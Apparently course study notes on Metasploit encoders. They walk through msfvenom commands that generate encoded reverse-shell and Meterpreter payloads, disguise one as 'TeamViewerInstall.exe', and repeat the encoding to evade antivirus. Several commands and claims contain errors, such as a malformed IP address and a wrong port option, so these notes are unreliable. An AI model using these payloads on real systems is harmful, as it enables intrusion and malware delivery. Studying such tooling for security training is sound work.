# Metasploit Encoders 

A Metasploit #Encoder makes payloads compatible with different types of computer processors, architectures, and operating systems while also facilitating evasion of detection tools. They additionally remove hexadecimal opcodes known as 'bad characters'.

The following architectures are supported by encoders:

- x64
- x86
- sparc
- ppc
- mips

Shikata Ga Nai ( #SGN) is a very common encoding scheme that is adept at evading detection tools. It is so evasive and persistent that it's name literally means "It cannot be helped" or "Nothing can be done about it".

### Selecting Encoders

Older iterations of Metasploit Framework predating 2015 used encoders that were separately packaged from the msfconsole files and stored within the /usr/share/framework2/ directory. These were known as msfpayload and msfencode and allowed a user to create and encode custom payloads via the pipe command.

An example of these two modules in use is as follows:

>msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\\x00' -f perl -e x86/shikata_ga_nai

These two tools were combined in the the #msfvenom tool after 2015 and here is an example of its use:

>msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.01 LPORT=4444 -b "\\x00" -f perl

This will open the $buf interface.

#### Showing Encoders

If we choose to set a payload, we can then issue the command show encoders, which is similar to using the show options command.

>set payload 15
>show encoders

This will populate the list of encoders that will work with our x64 system. A list will be generated that is compatible wit the systems available for our exploit of choice. 

For this example we will use the MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit. Once you have loaded the module, execute the 'show encoders' command:

>show encoders

We may need to encode our payload more than once to avoid being detected by anti-virus software. 

Use the following command to view the payload in exe format for x86 architecture on Windows:

>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

This will execute a reverse #TCP shell with the encoded Shikata Ga Nai payload. This would be detected by anti-virus software. To avoid this we would want to run it through the encoding process multiple times as shown in the following example:

>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 PORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe

Although we will encode this several extra times, it will still be detected by anti-virus software. Metasploit offers a tool called msf-virustotal that can be used in conjunction with an #API key to analyze payloads. Create a free account on VirusTotal to access this tool.

After downloading the tool we can use the following command to evade the anti-virus software:

>msf-virustotal -k \<API key> -f TeamViewerInstall.exe

Unfortunately even this method would be unsuccessful at evading AV software. We will cover this in further detail in later modules.

